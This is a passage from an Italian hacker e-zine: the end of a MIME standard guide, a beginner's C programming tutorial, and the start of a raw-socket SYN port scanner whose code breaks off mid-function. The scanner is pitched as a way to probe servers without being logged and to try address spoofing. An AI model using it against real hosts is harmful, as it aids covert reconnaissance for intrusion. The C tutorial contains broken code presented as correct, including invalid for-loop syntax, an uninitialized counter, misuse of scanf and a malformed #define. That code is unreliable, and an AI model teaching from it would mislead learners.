                 Content-Type: Message/Partial;
                      number=3; total=3;
                      id="oc=jpbe0M2Yt4s@libero.it";

	La numerazione di parte inizia con 1, non con 0.

	Quando le parti di un messaggio smantellato in questo modo sono riunite 
	insieme, il risultato è un messaggio di formato RFC 822 completo, che 
	può avere il proprio campo di intestazione Content-Type e può contenere 
	così qualsiasi altro tipo di dati.

	Quando generano e rimontano le parti di un message/partial, le 
	intestazioni del messaggio incapsulato devono essere unite con le 
	intestazioni delle entità inclusive. 


	Alcuni agenti di trasferimento (ad esempio SMTP) possono scegliere di 
	frammentare automaticamente grandi messaggi.

	* Sottotipo Message/External-Body

	Il sottotipo external-body indica che i dati di corpo effettivi sono non 
	inclusi, ma solo referenziati. In questo caso, i parametri descrivono un 
	meccanismo per l'accesso ai dati esterni. Guardiamo direttamente 
	l'esempio:

		Content-type: message/external-body; access-
                type=local-file;
                      name=/u/nsb/Me.gif

                Content-type: image/gif

                QUESTO NON È REALMENTE IL CORPO!

	Non mi dilungo oltre su questo sottotipo tenete presente che può 
	inglobare i seguenti parametri 
	
	ACCESS-TYPE "FTP", "anon-ftp", "tftp", "afs", "local-file", "MAIL-SERVER"
	EXPIRATION 
	SIZE 
	PERMISSION 
	NAME
	SITE 
	DIRECTORY 
	MODE 
	SERVER 

	MIME non definisce una sintassi del mail server, piuttosto, permette 
	l'inclusione di comandi di mail server arbitrari nel corpo fantasma. 

	Il meccanismo external-body non è progettato per essere limitato al 
	reperimento di file, come mostrato nell'esempio. Oltre questo, uno può 
	immaginare, ad esempio, di utilizzare un server video per riferimenti 
	esterni a video clip.

* Application - Content-Type

"Application" Content-Type deve essere utilizzata per dati che non vanno bene in 
una qualunque delle altre categorie e in particolare per dati che devono essere 
elaborati da utilizzi mail-based dei programmi applicativi. Questo tipo di 
messaggio deve essere elaborato da un'applicazione prima che sia visualizzabile 
o utilizzabile dall'utente.

Gli utilizzi attesi per applicazione Content-Type includono trasferimento file, 
fogli elettronici, dati per sistemi di pianificazione mail-based, posta 
elettronica computazionale. (l'ultimo, in particolare, può porre problemi di 
sicurezza che dovrebbero essere capiti da chi implementa un sistema del genere).

Ad esempio, un programma di pianificazione di riunione potrebbe definire una 
rappresentazione standard per informazioni su date proposte. L'agente di utente 
(quale outlook) utilizzerebbe queste informazioni per visualizzare una finestra 
di dialogo e potrebbe inviare quindi ulteriore posta basata su quella finestra 
di dialogo. Più generalmente, ci sono state numerose lingue di invio messaggi 
"attive", sviluppate, in cui i programmi in una lingua adeguatamente 
specializzata sono inviati attraverso la posta ed eseguono automaticamente 
l'ambiente del destinatario.

Tali applicazioni possono essere definite come sottotipi del "application" 
Content-Type. Definiamo ora tre sottotipi: octet-stream, ODA e PostScript.

Di solito, il sottotipo di applicazione spesso sarà il nome dell'applicazione a 
cui i dati sono destinati.

Questo non significa, tuttavia, che qualsiasi nome del programma applicativo può 
essere utilizzato liberamente come un sottotipo di applicazione. Tali utilizzi 
devono essere registrati con IANA.

	* Sottotipo (principale) The Application/Octet-Stream

        Il sottotipo principale di applicazione, "octet-stream", può essere 
        utilizzato per indicare che un corpo contiene dati binari.

        NAME -- un nome suggerito per i dati binari se memorizzati come 
        un file.

        TYPE -- il tipo generale o la categoria di dati binari. Questo è 
        destinato come informazioni per il destinatario umano piuttosto che per 
        qualsiasi elaborazione automatica.

        CONVERSIONS -- l'insieme di operazioni che sono state eseguite sui dati 
        prima di metterlo nella posta (e prima di qualsiasi Content-Transfer-
        Encoding che potrebbe essere stato applicato). Se più conversioni si 
        sono verificate, esse devono essere separate da virgole e specificate 
        nell'ordine di applicazione, la conversione posta più a sinistra deve 
        essersi verificata per prima.

        PADDING -- il numero di bit di riempitivo che è stato aggiunto al 
        bitstream comprendendo il contenuto effettivo per produrre i dati 
        acclusi byte-oriented. Questo è utile per l'inserimento di un bitstream 
        in un corpo quando il numero totale di bit non è un multiplo della 
        dimensione del byte, ricordate base64 il principio è lo stesso

	Tuttavia, l'utilizzo di tali conversioni è esplicitamente scoraggiato a 
	causa di una mancanza di portabilità e standardizzazione. 


        * Sottotipo Application/PostScript

        Un Content-Type " Application/PostScript " indica un Programma 
        PostScript. L'esecuzione di interpreti di uso comune PostScript comporta 
        rischi gravi di sicurezza. Mentre di solito è sicuro inviare postscript 
        a una stampante, dove il potenziale danno è molto vincolato e limitato.

	Il resto di questa sezione descrive alcuni, sebbene probabilmente non 
	tutti, dei possibili problemi con l'invio di PostScript attraverso la 
	posta.

	Le operazioni pericolose nella lingua PostScript includono gli operatori 
	deletefile, renamefile, filenameforall e il file PostScript. Le 
	implementazioni possono anche definire operatori di file nonstandard 
	aggiuntivi; questi possono anche porre una minaccia alla sicurezza. Ad 
	esempio Filenameforall, l'operatore di ricerca di file di carattere 
	jolly, può sembrare a prima vista essere innocuo, tuttavia, questo 
	operatore ha il potenziale di rivelare informazioni su a quali file il 
	destinatario ha accesso e queste informazioni stesse possono essere 
	sensibili. I mittenti di messaggio dovrebbero evitare l'utilizzo di 
	operatori di file potenzialmente pericolosi, poiché è abbastanza 
	probabile che questi operatori non siano disponibili in implementazioni 
	sicure PostScript. 

	PostScript fornisce agli operatori l'impostazione di parametri system- 
	wide e device-specific. Queste impostazioni del parametro possono essere 
	mantenute attraverso job e possono porre potenzialmente una minaccia 
	all'operazione corretta dell'interprete. Gli operatori PostScript che 
	impostano parametri di sistema e di dispositivo includono gli operatori 
	setsystemparams e setdevparams.

	Alcune implementazioni PostScript forniscono le funzioni per il 
	caricamento diretto e l'esecuzione di codice di macchina nonstandard. 

	È anche possibile scrivere programmi che vanno in loop infinitamente.

	Entrambi i tipi di programmi hanno il potenziale per causare danno se 
	inviato a destinatari non sospettosi.

	* Sottotipo The Application/ODA

	Il sottotipo "ODA" di applicazione è utilizzato per indicare che un 
	corpo contiene informazioni codificate secondo l'Office Documentate 
	standard Architecture [ODA], utilizzando il formato di rappresentazione 
	ODIF. Per applicazione/oda, il Content-type dovrebbe anche specificare 
	una coppia di attributo/valore che indica il profilo di documento (DAP) 

* Image - Content-Type

Un Content-Type di "immagine" indica che il corpo contiente un'immagine. Il 
sottotipo specifica una nome. Questi nomi non sono capsensitive. Due sottotipi 
iniziali sono "jpeg" per il formato, per la codifica JFIF e il "gif" JPEG per 
formato GIF.

* Audio - Content-Type 

Un Content-Type "audio" indica che il corpo contiene dati audio. 

Il sottotipo iniziale di base è specificato per soddisfare questo requisito 
fornendo un comune formato audio.

Il contenuto del sottotipo "audio/basic" è audio codificato utilizzando ISDN 
u-law [PCM] a 8 bit. 

* Video - Content-Type

Un Content-Type "video" indica che il corpo contiene un'immagine time-varying-
picture, possibilmente con colore e suono coordinato. Il sottotipo "mpeg" si 
riferisce a video codificato secondo lo standard MPEG, etc 



***   Ricapitolando   ***

Non è sicuramente atteso che tutte le implementazioni future supporteranno tutti 
i Content-Types descritti, né che essi condivideranno le stesse estensioni. Per 
promuovere l'interoperabilità, tuttavia, è utile definire il concetto di "MIME-
conformance" (conforme - MIME) che permette l'interworking utile di messaggi.

Un agente di utente di posta che è MIME-conformant dovrà:

* Generate sempre un "MIME-Version": 1.0 "campo di intestazione".

* Riconoscere il campo di intestazione Content-Transfer-Encoding e decodificate 
tutti i dati ricevuti codificati o con il quoted-printable o con le 
implementazioni base64. Codificare qualsiasi tipo di dati non solo in 
rappresentazione a sette bit mail-ready utilizzando una di queste trasformazioni 
e includere il campo di intestazione Content-Transfer-Encoding appropriato

* Riconoscere e interpretate il campo di intestazione Content-Type ed evitare di 
mostrare dati non formattati a utenti con un campo Content-Type diverso da 
testo. Essere in grado di inviare almeno text/plain, con la serie di caratteri 
specificata come un parametro se non è US-ASCII.

* Gestisre esplicitamente i seguenti valori Content-Type, ad almeno le seguenti 
estensioni:

	Text:

	-- Riconoscere e visualizzate posta "di testo" con la serie di caratteri 
	"US-ASCII".

	-- Riconoscere le altre serie di caratteri almeno all'estensione e di 
	essere in grado di dare informazioni all'utente su quale serie di 
	caratteri il messaggio utilizza.

	-- Riconoscere le serie di caratteri "ISO-8859-*", di essere in grado di 
	visualizzare quei caratteri che somigliano comuni a ISO-8859-* e US-
	ASCII, cioè tutti i caratteri rappresentati dai valori dell'ottetto 0-
	127.

	Message:

	-- Riconoscere e visualizzate almeno l'incapsulamento principale.

	Multipart:

	-- Riconoscere il sottotipo principale (mixed). Mostrare tutte le 
	informazioni relative sul livello di messaggio e il livello di 
	intestazione

	-- Riconoscere il sottotipo "alternative" ed evitate di mostrare parti 
	ridondanti di multipart/alternative all'utente.

	-- Trattate qualsiasi sottotipo non riconosciuto come se essi fossero 
	"mixed". Application: -- Offrite la capacità per rimuovere l'uno o 
	l'altro dei due tipi di Content-Transfer-Encode definito in questo 
	documento e mettere le informazioni che risultano in un file utente.

* A condizione di incontrare qualsiasi Content-Type non riconosciuto deve essere 
utilizzato come octet-stream.

Si dice che è un client che incontra le precedenti condizioni è MIME-conformant.            



***   Conclusioni   ***

Se non avete capito un azz della guida fatti vostri :) e non ditemelo neanche 
potri prenderVi per il collo :))))


********************************************************************************
IMPORTANTE

Per correttezza, visto che ogni promessa è un debito vi sendo la guida allo 
standard MIME, fatene buon uso, nonstante quello che è successo è giusto così, 
l'avevo promesso Inoltre non ho modificato nada tranne sta ultima nota ciauzzz 
a tutti roxyyy 
********************************************************************************


------------------------------------*END*--------------------------------------



------------------------------------[38]---------------------------------------
--------------------------------[MADlineDIE]-----------------------------------
-------------------------------[Linguaggio C]----------------------------------

   		        	    |¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯|
                            |    MADlineDIE tutorial     |
                            |        linguaggio c        |
                            |         contatti a:        |
                            |   MADlineDIE@hotmail.com   |
                            |____________________________|

Occorrente: un computer, un compilatore, musica non impegnativa, voglia di imparare.

[ Indice ]

- Il compilatore
- Input e Output standard
- Variabili e costanti
- Operazioni con le variabili
- Strutture di controllo
- I cicli
- Le matrici come variabili dimensionali

[ Il compilatore ]

Prima di definire 'compilatore' è meglio dare qualche altro termine.

Codice Sorgente: è la lista di istruzione che noi vogliamo far eseguire al nostro programma 
ed è scritto in linguaggio C.

Codice macchina: è il contenuto dei file eseguibili è scritto in un modo quasi incomprensibile 
ed è il linguaggio preferito dei computer perchè così 'ragionano'.

Adesso che avete imparato ben due vocaboli posso spiegarvi a grandi linee che cosa è un 
compilatore e cioè un interprete tra il Codice Sorgente e il Codice macchina, in poche parole 
non fà altro che prendere il codice che scriviamo, controllarlo da eventuali errori e 
tradurlo nel codice macchina che potrà poi essere eseguito sul computer.

[ Input e Output standard ]

Per facilitare scriverò adesso un piccolo programma che stamperà a video una scritta da 
noi preimpostata:

----- inizio -----

#include <stdio.h>

main() {

	printf("Sono il re del mondo\ne sono anche un'po megalomane");
}

-----  fine  ----- 

Il programma sopra indicato stamperà sullo standard Output (di solito il monitor) la scritta:

Sono il re del mondo
e sono anche un'po megalomane

Ma adesso analizziamo il codice e vediamo di capire che cosa è successo.

La prima riga #include <stdio.h> dice al compilatore che per compilare correttamente deve 
andare a prendere il file stdio.h (standard input output) e sostituirlo alla prima riga del 
nostro codice.
In questo modo tutto il contenuto del file, che contiene le funzioni di IO principali, viene 
copiato in testa al codice.

La seconda riga main() { richiama la funzione main che sarà come una scrivania per noi, da 
qui infatti potremo eseguire tutte le funzioni e le operazioni che vogliamo.
Le parentesi vuote indicano che non vogliamo passare nessun valore alla funzione e la graffa 
indica che da li inizia il contenuto della funzione.

Adesso printf("Sono il re del mondo\ne sono anche un'po megalomane"); questa è la funzione 
printf che serve appunto a stampare su standard output (monitor) quello che vogliamo. A 
differenza di main qui abbiamo passato dei valori alla funzione e cioè una sequenza di 
caratteri che andranno a finire appunto sul monitor.
Se si fa attenzione si nota anche il carattere speciale '\n' vuol dire 'new line' e fa andare 
a capo il cursore. Ricordarsi anche il punto e virgola dopo la parentesi tonda che indica che 
la funzione può essere abbandonata.

E finalmente come ultima riga la parentesi graffa di chiusura che termina il main e quindi fa 
terminare anche l'esecuzione del programma stesso.

Ma adesso passiamo alla funzione standard di input.

Eccovi qui un'altra porzione di codice:

----- inizio -----

#include <stdio.h>

char scritta[100];

main() { 

	scanf("%c", &scritta);
}

-----  fine  -----

Senza stare a ripetere tutto da capo illustrerò solo le nuove righe:

Char scritta[100] crea una matrice di caratteri (cento per l'esattezza), è come avere cento 
celle tutte in grado di contenere un carattere. ( il concetto sarà illustrato debitamente
 nel capitolo sulle matrici dimensionali )

La funzione scanf("%c", &scritta); è la funzione che si occuperà di prelevare da standard 
input (di solito tastiera) ogni carattere premuto e passarlo in sequenza alla matrice 
'scritta', finchè non viene premuto invio o arriva un carattere EOF (End Of File).
La sintassi è la seguente scanf("tipo di variabile da prelevare", &variabile finale); infatti 
%c stà a significare proprio Character (carattere).
Il simbolo & è l'operatore unario che vedremo in seguito; qui è responsabile del passaggio 
del valore premuto alla variabile.

Ma vediamo il funzionamento di questo programma:

dopo compilato lo lanciamo in esecuzione e scriviamo "la bella la va al fosso" e premiamo 
invio, la matrice scritta apparirà così:

_____________________________________________________
|L|a| |b|e|l|l|a| |l|a| |v|a| |a|l| |f|o|s|s|o| | | | ECCETERA fino alla centesima
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
Bene spero che abbiate capito tutto forse è meglio che facciate qualche esperimento e 
vediate un'po come funziona il discorso.

[ Variabili e costanti ]

Adesso possiamo iniziare a parlare di variabili che saranno la base portante di tutti i 
dati che dovremmo trattare.

Prima di cominciare dico subito che la portata massima (il valore massimo) di una variabile 
in alcuni computer può cambiare, questo dipende dall'architettura hardware e non ci potete 
fare nulla, quindi rilassatevi.

Adesso vi faccio una tabella:

+------------------------+----------------------------+------+-------------+--------------------+
|         Type           |       Max & min value      |  Bit |  Precision  |    Dichiaratori    |
+------------------------+----------------------------+------+-------------+--------------------+
| integer                | -32768 a 32767             |  16  |             | int                |
| unsigned integer       | 0 a 65535                  |  16  |             | unsigned int       | 
| long integer           | -2147483648 a 2147483647   |  32  |             | long int           |
| unsigned long integer  | 0 a 4294967295             |  32  |             | unsigned long int  |
| short integer          | -32768 a 32767             |  16  |             | short int          |
| unsigned short integer | 0 a 65535                  |  16  |             | unsigned short int |
| character              | -128 a 127                 |  8   |             | char               |
| unsigned character     | 0 a 255                    |  8   |             | unsigned char      |
| floating point         | 3,4*10^-38 a 3,4*10^38     |  32  |   7 cifre   | float              |
| double precision       | 1,7*10^-308 a 1,7*10^308   |  64  |   15 cifre  | double             |
| long double precision  | 3,4*10^-4932 a 3,4*10^4932 |  80  |   19 cifre  | long double        |
+------------------------+----------------------------+------+-------------+--------------------+

Come potete notare il suffisso 'unsigned' non fà altro che dire al programma che quel numero 
non può avere segno negativo e questo fà in modo che il valore massimo raddoppi e il minimo 
si annulli salendo a zero.

Per dichiarare una variabile basta scrivere il dichiaratore corrispondente a come descritto 
in tabella e il nome della variabile. Es:

int formaggio;
char pesce;
int televisione;

Per abbreviare questo procedimento si possono dichiarare tutte le variabili dello stesso 
tipo direttamente su un unica riga separandole con una virgola. Es:

int formaggio, televisione;
char pesce;

Adesso proviamo ad assegnare dei valori a queste variabili.

formaggio = 7;
televisione = formaggio;
pesce = a;
formaggio = televisione + 5;

Adesso abbiamo i seguenti valori: 

formaggio = 12
televisione = 7
pesce = a

Come possiamo notare, per prima cosa, gli assegnamenti vengono effettuati da destra verso 
sinistra ( il valore 7 vieneinserito in formaggio ) e come seconda cosa anche dopo che 
televisione era stato eguagliato a formaggio, ad un cambiamento di formaggio televisione non 
ne ha risentito alcun cambiamento.

Adesso parliamo delle costanti, cioè quei valori che dopo un assegnamento non possono essere 
più modoficati.
La sintassi di dichiarazione è la seguente:

#define NOMECOSTANTE valore;

Il fatto ch io abbia scritto il NOMECOSTANTE in maiuscolo non significa che sia obbligatorio 
ma rende più leggibile il codice  finale.
Le costanti sono anche usate come macro per esempio:

#define AREA base*altezza;

Definisce AREA come una moltiplicazione di area per altezza, in modo da rendere più semplice 
la programmazione.

[ Operazioni con le variabili ]

Le operazioni principali sono le solite quattro addizione, sottrazione, moltiplicazione e 
divisione.
I simboli usati per rappresentarle sono + (addizione) - (sottrazione) * (moltiplicazione) 
/ (divisione).
Altro operatore è il modulo che ha il simbolo % che ritorna il resto della divisione 
effettuata e quindi ritorna 0 in caso il primo numero sia un multiplo del secondo.

Al fine di rendere più scorrevole il codice si può usare questa sintassi:

costo *= prodotti;

al posto del più ingombrante

costo = costo * prodotti;

[ Strutture di controllo ]

Le strutture di controllo servono per fare test di validità su determinate variabili.

L'istruzione if per esempio ha la seguente sintassi:

if ( espressione ) { 
istruzioni da eseguire se test risualta vero 
}
else { 
istruzioni alternative da eseguire
}
 
per esmpio il codice:

----- inizio -----

#include <stdio.h>

int numero;

main() {

printf("Scrivi un numero maggiore di 47: ");

scanf("%d", &numero);

if ( numero > 47 ) {
	printf("\n\nbravo sai contare");
}
else {
	printf("\n\nma quanto sei idiota brutto e scemo !!!");
}

}

------ fine ------

In questo codice viene prima stampato a monitor la scritta 'Scrivi un numero maggiore di 47' 
successivamente viene raccolto il valore 'numero' che verrà immesso dall'utente e infine verrà 
eseguito il test che verificherà se il numero è maggiore di 47, in caso di positività verrà 
stampato 'bravo sai contare' nel caso contrario 'ma quanto se idiota brutto e scemo !!!'.

Per rendere più leggibile il codice in questo caso potremmo anche omettere le parentesi 
graffe sia nell'if che nell'else, visto che entrambe sono dotate di una sola istruzione. 
es:

if ( numero > 47 ) printf("\n\nbravo sai contare");
else printf("\n\nma quanto sei idiota brutto e scemo !!!");

In questo modo il codice risulterà molto più leggibile.

Nel caso poi si voglia estendere la portata del test potremmo usare quest'altra sintassi:

if ( espressione ) { 
istruzioni da eseguire se test risualta vero 
}
else if ( espressione 2 ) { 
istruzioni alternative da eseguire
}
else {
istruzioni alternative da eseguire
}

Credo che qui non ci sia bisogno di spiegare.

Adesso passiamo ad un'altra struttura di controllo, e cioè lo switch.
La sintassi è la seguente:

switch(variabile da testare) {

case 0:
istruzioni se uguale a 0
break;

case 1:
istruzioni se uguale a 1
break;

case 2:
istruzioni se uguale a 2
break;

etc etc etc ...

}

Anche qui il meccanismo è semplice se il valore presente nella variabile da testare è 
uguale a 0 verranno eseguite le rispettive istruzioni se uguale a 1 le altre etc etc. Da 
notare l'istrzione break che fà terminare in qualsiasi punto venga richiamata la funzione 
switch.

Credo di aver detto abbastanza sulle strutture di controllo almeno per ora.

[ I cicli ]

Adesso mi occuperò dei più usati cicli, come il while, il for, il do while.

La sitassi del while è la seguente:

while(espressione) {

istruzioni da eseguire se l'espressione sisulta vera

}

Se per esempio ci trovassimo a dover inserire dei dati in un array, ammettiamo che siano 
numeri scelti dall'utente potremmo scrivere il codice:

----- inizio -----

#include <stdio.h>

main(){

int numeri[10], contatore;

printf("Array di numeri\n\n");

while(contatore <= 9) {

printf("inserisci un numero: ");
scanf("%d", &numeri[contatore]);
++contatore;

}

------ fine ------

In questo modo abbiamo risparmiato di scrivere dieci volte la sequenza di istruzioni contenute 
all'interno del while appena visto. Il funzionamento mi pare abbastanza scontato, la 
condizione per il quale il ciclo deve essere eseguito è che la variabile contatore sia minore 
o uguale a 9 ( e cioè deve essere eseguita dieci volte ), la condizione risualta vera per i 
primi dieci cicli grazie all'operazione ++contatore ( che è come dire contatore = contatore 
+ 1 ), che eseguita ogni volta blocca l'esecuzione al decimo ciclo e permette di incrementare 
anche il riferimento all'array numeri[] che immagazzina dati ogni volta nella cella successiva.
Fare attenzione alla posizione dell'operazione ++contatore che è stata messa di proposito in 
fondo alla sequenza, altrimenti il completamento dell'array sarebbe partito dalla cella 
numero 1 invece della 0 causando all'ultima operazione un errore.

Il ciclo for è più complesso ma risulta più compatto, la sua sintassi è la seguente:

for(assegnazione variabili, condizione, contatore) {
istruzioni da eseguire
}

Nel primo campo all'interno delle parentesi vanno assegnati i valori alle variabili 
necessarie magari come contatore, nel secondo invece va messa la condizione in modo analogo 
all while, nel terzo campo viene messa l'operazione che incrementa il contatore. Notare che 
ognuno di questi campi può essere omesso semplicemente lasciando lo spazio vuoto ( ma 
scrivendo comunque la vigola ).

----- inizio -----

#include <stdio.h>

main(){

int numeri[10], contatore;

printf("Array di numeri\n\n");

for(contatore = 0, contatore <= 9, contatore++) { 
printf("inserisci un numero: ");
scanf("%d", &numeri[contatore]);
}

-----  fine  -----

Credo che qui sia tutto chiaro, ma faccio presente il ++ che in questa occasione deve essere 
invece che prefisso, postfisso.
La differenza a prima vista non si vede ma può causare un errore infatti se prefisso il ++ 
prima incrementa la variabile di 1 e poi la utilizza, quando postfisso ( il nostro caso ) 
prima viene utilizzata poi viene incrementata.
Se non avessimo avuto questo accorgimento ci saremmo imbattuti nello stesso errore causato 
dal while se avessimo messo prima l'operazione ++conatore di tutte le istruzioni ( uno 
sconfinamento dell'array ).

Infine il do while, la sintassi è la seguente:

do {
istruzioni }
while(condizione);

Il funzionamento è identico al while, l'unica differenza stà nel fatto che prima vengono 
eseguite le operazioni e poi viene verificata la condizione.

[ Le matrici come variabili multidimensionali ]

Abbiamo già usato le matrici ma non ne abbiamo ancora parlato.

Le matrici sono gruppi di variabili tutte dello stesso tipo indicizzate con numeri crescenti 
partendo da 0.

Per esempio:

int penne[90]; 

Crea una matrice chiamata penne composta da 90 variabili int.
Fare attenzione a non confondersi con i numeri, che sono tra gli errori più ricorrenti 
perchè anche il compilatore non li segnala, creando un array di 90 int avremmo una 
indicizzazione che parte da 0 e arriva a 89, quindi possiamo dire che in ogni array l'ultimo 
elemento corrisponde sempre al numero degli elementi meno 1.

Per gli assegnamenti basta scivere come visto in precedenza nomearray[indice] = valore; dove 
indice può essere un numero oppure una variabile che lo rappresenta.

Ma adesso pensiamo a creare un array a più dimensioni:

int class[5][5][5];

In questo modo abbiamo creato un array multidimensionale che ha '3' dimensioni di 5 valori 
ciascuna per un totale di 5 * 5 * 5 elementi e cioè 125 int che possono essere assegnati 
nel solito modo  nomearray[indicex][indicey][indicez] = valore;.
Un array può contenere quante dimensioni si voglia e può essere di qualsiasi tipo ( int, 
char, double etc ).

--------------------------------------------------------------------------
Spero di essere stato chiaro nello spiegare le basi del liguaggio C e se ne avrò la 
possibilità continuerò con altri tutorial che lo descriveranno più nel dettaglio e ne 
illustreranno alcune tecniche sia semplici che avanzate di programmazione.

Se avete dubbi o domande contattatemi a MADlineDIE@hotmail.com


------------------------------------*END*--------------------------------------



===============================================================================
-------------------------------------------------------------------------------
----------------------------------[Sources]------------------------------------
-------------------------------------------------------------------------------
===============================================================================


------------------------------------[39]---------------------------------------
--------------------------------[CityHunter]-----------------------------------
------------------------[Raw Socket Implementation]----------------------------


----[Intro]----

Forse forse riesco fare un altro tut prima di Natale. Ormai i regali sono stati
comprati, i primi panettoni mangiati, cosa fare? Perchè non proseguiamo col
nostro tut sui Raw?:-) Oggi vi presento come prima implementazione una cosa
piuttosto facile che in un certo senso prosegue il mio vecchio tut sui socket.
Oggi facciamo un portscanner più sicuro, meno loggabile. Questo perchè?
Perchè usando i raw faremo in modo di mandare ad ogni porta un pacchetto con flag
SYN e, se questa risponde, allora sarà aperta e il nostro kernel manderà un bel
RST. Noi non saremo loggati. E' molto raro infatti trovare server che logghino
delle semplici richieste SYN...abbiamo così ottenuto quello che volevamo:
SEGRETEZZA. In questo mondo o si è paranoici o si viene beccati, quindi occhio!!
Rispondo subito alla domanda che vi frullerà in testa: perchè mandiamo un RST?
Semplice, non è il kernel che comanda quella connessione, ma noi in tutto e per
tutto. Lui si ritrova con un pacchetto in arrivo con Flag SYN-ACK senza che lui
l'abbia chiesta,quindi la scarta mandando un RST.
In questa versione dello scanner voi dovrete specificare l'indirizzo di partenza,
il vostro IP cioè, il server da scannare(sia IP che URL) e la porta d'inizio e
di fine. Essendo Raw, come IP del client potreste mettere benissimo un indirizzo
falso, ma in questo modo le risposte del server andrebbero a quell'indirizzo
e non al nostro, sarebbe quindi una cosa inutile!(Potete farlo per provare...
sniffatevi mentre lo fate, è una prima sorta di spoofing).

Ora parliamo del codice: le spiegazioni le metto dentro il codice...senza tanti /*
e compagnia, vi allego tutto il codice alla fine:-)
Buona parte del codice è presa da Spoofit.h di coder@reptile...in fondo il
concetto è quello,perchè riscrivere tutto da capo?;-) Lo ringrazio già da adesso!
A voi lo spiego poi bene parlando dello spoofing!

Iniziamo il codice:


----[SYN PortScanner by CityHunter 2?/12/2001 V.1.0]----


#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>

/*I soliti include...nulla di nuovo sotto il sole...se volete sapere di più perchè
non vi leggete il codice?:-)*/

#define MTU                     1500
#define IP_VERSION              4
#define IP_HEAD_BASE            20
#define TCP_HEAD_BASE           20
#define INTERFACE               "ppp0"
#define INTERFACE_PREFIX        0
#define MY_COUNT                666
#define URG                     32
#define ACK                     16
#define PSH                     8
#define RST                     4
#define SYN                     2
#define FIN                     1

int DEV_PREFIX;
/*Ci servirà per determinare se usera ppp o eth...qui è ppp*/

sig_atomic_t WAIT_PACKET_WAIT_TIME = 0;
int fd_recive, fd_send;
/*Sono i due socket...vi ricordate che dovevo definirli qui prima come interi?
Bravi:-) Il primo sarà quello di ricezione, il secondo quello d'invio.*/

/* Iniziamo con le nostre belle strutture */

struct wait_packet
{
        unsigned long seq,ack;
        unsigned short flags;
        unsigned short source_p,dest_p;
        int datalen;
};

struct IPhdr
{
        unsigned char verlen, type;
        unsigned short tot_len, ID, flag_offset;
        unsigned char TTL, protocol;
        unsigned short checksum;
        unsigned long int saddr, daddr;
};

struct TCPhdr
{
        unsigned short source, dest;
        unsigned long int seq, ack_seq;
        unsigned short offset_flag, window, checksum, urgent;
};

struct pseudoIP
{
        unsigned long int source, dest;
        char zero_byte, protocol;
        unsigned short TCP_UDP_len;
};

/*Nulla da dire sulle strutture,leggetevi la prima parte del tut: Theroy!*/

int if_init(char *device)
{
	int if_fd;
	struct ifreq netif;
	char test;
	if ((if_fd = socket(AF_INET, SOCK_PACKET, htons(0x3)))==-1) {
        	perror("Can't Open PACKET SOCKET.");
		exit(1);
	}

	return if_fd;
}

/*Con questa funzione controlliamo che il nostro device(che è ppp in questo caso)
funzioni e che riesca a fare la chiamata al socket. Restituisce il valore 0 se è
tutto ok, se -1 restituisce errore.*/


unsigned short in_cksum(unsigned short *addr,int len)
{
        register long sum = 0;            /* assumes long == 32 bits */
        register unsigned short *w = addr;
        unsigned short answer = 0;         /* assumes u_short == 16 bits */
        register int nleft = len;;

        /*
        * Our algorithm is simple, using a 32-bit accumulator (sum),
        * we add sequential 16-bit words to it, and at the end, fold back
        * all the carry bits from the top 16 bits into the lower 16 bits.
        */

        while (nleft > 1)
        {                                /* per tutta la funzione:il checksum viene calcolato solo sull'header IP,non sui dati che trsmette*/
        sum += *w++;                   /*dati!!per la creazione di pacchetti quali IP,UDP ecc dobbiamo calcolare*/
                                         /* il checksum...si fa con la funzione*/
        nleft -= 2;                     /*rippata dal codice di ping.c:-)))*/
        }

                /* mop up an odd byte, if necessary */
        if (nleft == 1)
        {
        *(u_char *) (&answer) = *(u_char *)w;   /* one byte only */
        sum += answer;
        }

        /*
        * Add back carry outs from top 16 bits to low 16 bits.
        */

        sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
        sum += (sum >> 16);                     /* add carry */
        answer = ~sum;          /* ones-complement, then truncate to 16 bits */

        return(answer);
}

/*Beh...ma sapete già tutto!!La solita routine di checksum...già vista anche questa!*/

unsigned long nameResolve(char *hostname)
{
        struct in_addr addr;
        struct hostent *hostEnt;

        if((addr.s_addr=inet_addr(hostname)) == -1)
        if(!(hostEnt=gethostbyname(hostname)))
        {
                fprintf(stderr,"Unknown host:`%s`\n",hostname);
                exit(0);
        }
        bcopy(hostEnt->h_addr,(char *)&addr.s_addr,hostEnt->h_length);
        return addr.s_addr;
}

/*Qui controlliamo l'esistenza del server da scannare e interroghiamo il DNS
per la trasformazione da IP a URL.*/


/* from Spoofit by coder@reptile */
void wait_packet_timeout (int sig)
{
alarm(0);
WAIT_PACKET_WAIT_TIME=1;
}

int wait_pk(int fd,struct wait_packet *infoz,
                char *wp_source, unsigned short wp_source_port,
                char *wp_dest, unsigned short wp_dest_port, int wp_flags,
                int wait_time)
{
        char wp_buffer[1500];
        struct IPhdr *ip;
        struct TCPhdr *tcp;
        unsigned long sourcel, destl;
        int tcpstart;
        char proto;

        sourcel = nameResolve(wp_source);
        destl = nameResolve(wp_dest);

        WAIT_PACKET_WAIT_TIME=0;
        if(wait_time!=0) {
                signal(SIGALRM,wait_packet_timeout);
                alarm(wait_time);
        }

        while(1) {
                while(sniff_pk(fd, wp_buffer, &tcpstart, &proto)<=0) {
                        if (WAIT_PACKET_WAIT_TIME!=0) {
                                alarm(0);
                                return -1;
                        }
                };
           if(proto == 6) {
                ip= (struct IPhdr *) wp_buffer;
                tcp= (struct TCPhdr *) (wp_buffer+tcpstart);
                if((sourcel==ip->saddr) && (destl==ip->daddr)) {
                  if(((ntohs(tcp->source)==wp_source_port)
                     || (wp_source_port==0)) &&
                       ((ntohs(tcp->dest)==wp_dest_port)
                        || (wp_dest_port==0))) {
                        if( (wp_flags==0) || (ntohs(tcp->offset_flag)&wp_flags))
                        {
                                infoz->source_p=ntohs(tcp->source);
                                infoz->dest_p=ntohs(tcp->dest);
                                infoz->seq=ntohl(tcp->seq);
                                infoz->ack=ntohl(tcp->ack_seq);
                                infoz->flags=ntohs(tcp->offset_flag)&
